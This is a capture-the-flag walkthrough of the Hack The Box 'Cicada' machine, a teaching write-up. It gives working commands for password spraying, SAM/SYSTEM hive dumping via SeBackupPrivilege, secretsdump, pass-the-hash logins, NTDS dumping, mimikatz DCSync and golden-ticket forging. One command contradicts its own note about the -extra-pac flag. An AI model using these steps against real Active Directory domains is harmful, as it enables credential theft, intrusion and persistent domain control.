+++
title = "Cicada HTB Walkthrough: Active Directory Enumeration and SeBackupPrivilege Exploitation"
draft = false
tags = ["Windows", "HTB", "Hack The Box", "Active Directory", "LDAP", "RPC", "SeBackupPrivilege", "Registry Hive Dumping", "Kerberos", "Golden Ticket", "Privilege Escalation"]
keywords = ["Hack The Box Cicada", "Active Directory enumeration", "SeBackupPrivilege exploitation", "Registry hive dumping", "Golden Ticket creation", "Windows privilege escalation", "LDAP enumeration", "RPC enumeration", "Kerberos exploitation", "Windows security"]
description = "A comprehensive walkthrough of the Cicada machine from Hack The Box, demonstrating Active Directory enumeration techniques, exploitation of SeBackupPrivilege for registry hive dumping, and persistence through Golden Ticket creation."
author = "bloodstiller"
date = 2024-11-01
toc = true
bold = true
next = true
lastmod = 2024-11-01
+++

## Cicada Hack The Box Walkthrough/Writeup: {#cicada-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Cicada>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Cicada/scans/nmap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 09:35:04 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT
        Nmap scan report for 10.129.115.238
        Host is up (0.040s latency).
        Not shown: 989 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds

        ```
    -   **Initial thoughts**:
        -   Got some classics, DNS, Kerberos, SMB &amp; LDAP.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Cicada/scans/nmap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 09:35:12 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT
    Nmap scan report for 10.129.115.238
    Host is up (0.039s latency).
    Not shown: 65522 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-31 16:38:14Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    | Not valid before: 2024-08-22T20:24:16
    |_Not valid after:  2025-08-22T20:24:16
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    | Not valid before: 2024-08-22T20:24:16
    |_Not valid after:  2025-08-22T20:24:16
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    | Not valid before: 2024-08-22T20:24:16
    |_Not valid after:  2025-08-22T20:24:16
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    | Not valid before: 2024-08-22T20:24:16
    |_Not valid after:  2025-08-22T20:24:16
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    53003/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2022 (88%)
    Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2024-10-31T16:39:11
    |_  start_date: N/A
    |_clock-skew: 6h59m59s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 242.85 seconds

    ```

    -   **Findings**:
        -   RPC is enabled it seems.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 ldapchecker.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users

-   It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in HTB/BlogEntriesMade/Cicada/scans/ldap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 09:36:11 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
        Attempting to connect to 10.129.115.238 with SSL...
        Connected successfully using anonymous bind. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=cicada,DC=htb
            CN=Configuration,DC=cicada,DC=htb
            CN=Schema,CN=Configuration,DC=cicada,DC=htb
            DC=DomainDnsZones,DC=cicada,DC=htb
            DC=ForestDnsZones,DC=cicada,DC=htb
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=cicada,DC=htb
          ldapServiceName:
            cicada.htb:cicada-dc$@CICADA.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here's a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.
    -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-10-31-104650_.png" >}}
    -   Nothing of note.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   As kerberos is present we can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-10-31-104728_.png" >}}
    -   Nothing of note.


### RPC: {#rpc}

-   **I connect using anonymous session**:
    -   `rpcclient -U "" $box`
    -   {{< figure src="/ox-hugo/2024-10-31-110457_.png" >}}

-   **I connect using** `rpcclient` **using a null session**:
    -   `rpcclient -U "%" $box`
    -   {{< figure src="/ox-hugo/2024-10-31-110340_.png" >}}

-   I am unable to enumerate either.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
        -   We can access using the guest account and can see there is an HR share there.
            -   {{< figure src="/ox-hugo/2024-10-31-104931_.png" >}}
    -   `netexec smb $box -u '' -p '' --shares`
        -   No access via null share.


### Enumerating the HR Share: {#enumerating-the-hr-share}

-   **Connect to the share**:
    -   `smbclient -U 'guest' "\\\\$box\\Public"`
    -   {{< figure src="/ox-hugo/2024-10-31-105952_.png" >}}

-   **Find a file**:
    -   {{< figure src="/ox-hugo/2024-10-31-105916_.png" >}}

-   **Download file**:
    -   {{< figure src="/ox-hugo/2024-10-31-110012_.png" >}}


### Finding a hard-coded cred in "Notice from HR.txt": {#finding-a-hard-coded-cred-in-notice-from-hr-dot-txt}

-   **Reading the file there is a hard-coded password in the file**:
    -   {{< figure src="/ox-hugo/2024-10-31-132352_.png" >}}
    -   Now we just need a username to enumerate further.

-   **I check the exif information of the file incase there is any creator information there**:
    -   `exiftool Notice\ from\ HR.txt`
    -   {{< figure src="/ox-hugo/2024-10-31-133010_.png" >}}
    -   There is none


### Using impacket-lookupsid: {#using-impacket-lookupsid}

-   **We can use** `impacket-lookupsid` **to enumerate users on the domain**:
    -   `impacket-lookupsid $domain/guest@$machine.$domain -domain-sids`
    -   {{< figure src="/ox-hugo/2024-10-31-144901_.png" >}}
    -   +Note+: As we are using the "Guest" account we can just hit enter for a blank password


### Password Spraying: {#password-spraying}

-   With the new users list I password spray &amp; get a hit for the user: `michael.wrightson`
    -   {{< figure src="/ox-hugo/2024-10-31-145636_.png" >}}
    -   +Note+: We know it's Michael's password still as it does not have "`Guest`" written besides it.


#### Why does guest appear beside all the names? {#why-does-guest-appear-beside-all-the-names}

-   If you haven't seen this before check out this link.
    -   <https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon>
    -   Which says this:

        > Using a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you're targetting is enabled.
-   **Guest account in** `SMB`:
    -   `SMB` servers often allow users to connect as a `Guest`, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files.
    -   In this case `authority.htb\[user]:[Pass](Guest)` indicates that the `[user]` account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources.
    -   So when you see "`Guest`" listed after users like `authority.htb\ryan`, `authority.htb\tom`, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB.


## 2. Foothold: {#2-dot-foothold}


### Enumerating as michael.wrightson: {#enumerating-as-michael-dot-wrightson}

-   **We can see we have access to more shares**:
    -   {{< figure src="/ox-hugo/2024-10-31-151025_.png" >}}
    -   I check the shares but there is nothing of note.


### Enumerating users using RPC: {#enumerating-users-using-rpc}

As we have credentials we can perform credentialed RPC enumeration now.

-   **I connect using** `rpcclient`:
    -   `rpcclient -U $user $box`

-   **Let's list the users on the domain so we can get their** `RID`
    -   `enumdomusers`
    -   {{< figure src="/ox-hugo/2024-10-31-173716_.png" >}}


### Finding a password in the description field via RPC: {#finding-a-password-in-the-description-field-via-rpc}

-   Enumerating the users I find the user `david.orelius` has stored their password in clear text in the description field of their account:
    -   `queryuser 0x454`
    -   {{< figure src="/ox-hugo/2024-10-31-173950_.png" >}}


### Enumerating as david.orelius: {#enumerating-as-david-dot-orelius}

-   **We can see we have access to the** `DEV` **share as david**:
    -   {{< figure src="/ox-hugo/2024-10-31-174326_.png" >}}


#### Finding a backup script in the DEV share. {#finding-a-backup-script-in-the-dev-share-dot}

-   **I connect to the** `DEV` **share and find the script** `Backup_script.ps1`.
    -   `smbclient -U $user "\\\\$box\\DEV"`
    -   {{< figure src="/ox-hugo/2024-10-31-174524_.png" >}}

-   **I download the script**:
    -   `get Backup_script.ps1`
    -   {{< figure src="/ox-hugo/2024-10-31-174616_.png" >}}


#### Finding credentials in the backup script: {#finding-credentials-in-the-backup-script}

-   **Looking in the script I find credentials for the user** `emily.oscars`:
    -   {{< figure src="/ox-hugo/2024-10-31-174700_.png" >}}


### Authenticating as emily.oscars: {#authenticating-as-emily-dot-oscars}

-   **Authenticating as emily we can see she has access to more shares**:
    -   {{< figure src="/ox-hugo/2024-10-31-175606_.png" >}}

-   **I login via** `evil-winrm`:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-31-175734_.png" >}}

-   **I grab the user flag**:
    -   {{< figure src="/ox-hugo/2024-10-31-180345_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Discovering we are part of the backup operators group: {#discovering-we-are-part-of-the-backup-operators-group}

-   Checking emily's group membership we can see she is part of the `backup operators` group:
    -   `whoami /groups`
    -   {{< figure src="/ox-hugo/2024-10-31-180526_.png" >}}
    -   This means we will have the `SebackupUpPrivilege`:
        -   {{< figure src="/ox-hugo/2024-10-31-180814_.png" >}}
        -   The `SeBackupPrivilege` allows us to backup the SAM &amp; System registry hives.


#### Backup Operators &amp; SeBackupPrivilege Primer: {#backup-operators-and-sebackupprivilege-primer}

-   **Members of the** `Backup Operators` **&amp;** `Server Operators` **get the** `theSeBackupPrivilege` **by default**
-   This privilege will allow us to copy a file from a folder, even if there is no access control entry (`ACE`) for our user on the folder's access control list (`ACL`) However, we cannot copy using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag. This means we can use tools like `reg save` as it allows registry hives to be exported whilst bypassing `ACLs`

-   **Key Information About this privielge**:
    -   Allows a process to read any file, regardless of the file's permissions.
    -   Used primarily for backup applications that need access to all files.
    -   Bypasses standard file read permissions.
    -   Does not enable writing or deleting files, only reading.
    -   Typically assigned to backup software or administrative tasks.

-   **Security Considerations**:
    -   High potential for abuse if granted to unauthorized applications or users.
    -   Should be closely monitored and restricted to trusted applications and personnel.


## 4. Ownership: {#4-dot-ownership}


### Dumping Registry Hives &amp; extracting creds using secretsdump: {#dumping-registry-hives-and-extracting-creds-using-secretsdump}

-   As mentioned previously we can use the `reg save` command to programatically copy the registry the hives and bypass ACL's. The only reason we can do this is due to us having the `SeBackupPrivilege`

-   **I Dump the Hives**:
    -   `reg save HKLM\SYSTEM SYSTEM.SAV`
        -   {{< figure src="/ox-hugo/2024-10-31-181418_.png" >}}
    -   `reg save HKLM\SAM SAM.SAV`
        -   {{< figure src="/ox-hugo/2024-10-31-181430_.png" >}}

-   **I transfer the hives back to my attack machine**:
    -   {{< figure src="/ox-hugo/2024-10-31-181557_.png" >}}

-   **Extract the secrets using** `impacket-secretsdump`:
    -   `impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL`
    -   {{< figure src="/ox-hugo/2024-10-31-181844_.png" >}}

-   **Login as the administrator using their hash**:
    -   `evil-winrm -i $box -u $user -H $hash`

-   **Get our root flag**:
    -   {{< figure src="/ox-hugo/2024-11-01-123531_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Dumping NTDS.dit: {#dumping-ntds-dot-dit}

-   **I dump the ntds.dit using** `netexec`:
    -   `netexec smb $box -u $user -H $hash -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-31-182224_.png" >}}
    -   +Note+:
        -   Need to sort out these errors, this is a fresh VM so need to sort these python errors out.


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

-   **I upload** `nc64.exe` **and** `mimikatz.exe` **via** `evil-winrm` **session**:
    -   {{< figure src="/ox-hugo/2024-10-31-184255_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-31-184307_.png" >}}

-   **Start a reverse shell back to my attack machine**:
    -   {{< figure src="/ox-hugo/2024-10-31-184335_.png" >}}
    -   Evil-winrm does not play nice with mimikatz so we need standard reverse-shell.

-   **Extract SID &amp; KRBTGT hashes**:
    -   `lsadump::dcsync /user:krbtgt /domain:cicada.htb`
    -   {{< figure src="/ox-hugo/2024-10-31-184359_.png" >}}

-   **Create ticket**:
    -   `kerberos::golden /domain:cicada.local /user:Administrator /sid:S-1-5-21-917908876-1423158569-3159038727 /rc4:[rc4hash]`
    -   {{< figure src="/ox-hugo/2024-10-31-184230_.png" >}}
    -   This has a typo (I can see now there is a trailing dash after the `SID` however it still won't work. Read on)

-   **Download the** `.kirbi`
    -   {{< figure src="/ox-hugo/2024-10-31-184515_.png" >}}

-   **Convert** `.kirbi` **to** `.ccache`:
    -   `impacket-ticketConverter ticket.kirbi admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-31-192135_.png" >}}

-   **Setup** `KRB5CCNAME` **var**:
    -   `export KRB5CCNAME=./admin.ccache`

-   **Try and connect**:
    -   {{< figure src="/ox-hugo/2024-11-01-113642_.png" >}}
    -   It fails this is because I used the rc4 hash instead of the `AES` hash. So let's generate a new ticket using the `aesKey`.

-   **I create a new ticket using** `ticketer.py`:
    -   `python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator`
    -   {{< figure src="/ox-hugo/2024-11-01-113804_.png" >}}
    -   +Imporant Note+: You do not need the `extra-pac` parameter the following will work, I was just airing on the side of caution as I had read this issue: <https://github.com/fortra/impacket/issues/1457> however the pull request was merged so should be resolved. This command will work (have also tested)
        -   `python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator`

-   **Connect with** `psexec`:
    -   {{< figure src="/ox-hugo/2024-11-01-113904_.png" >}}


### Golden Ticket Curiosities: {#golden-ticket-curiosities}

-   When generating a ticket using ticketer.py I can create the ticket and it works fine.
    -   `python3 ../ticketer.py -aesKey [Key] -domain-sid [SID] -domain $domain administrator`

-   However when using mimikatz to generate the ticket, I use the exact same key SID etc:
    -   `kerberos::golden /domain:[domain] /user:administrator /sid:[SID] /aes256:[Key]`

I always get the error `[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)` when trying to use the mimikatz generated one. I have done various testing and unsure as to why.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1. This was mainly about enumeration. Enumerating well and thoroughly. 

### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1. Frustratingly trying to determine the mimikatz ticket issue, it's annoying me. So it's not a mistake. Just grinding my gears until I figure it out. 



## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


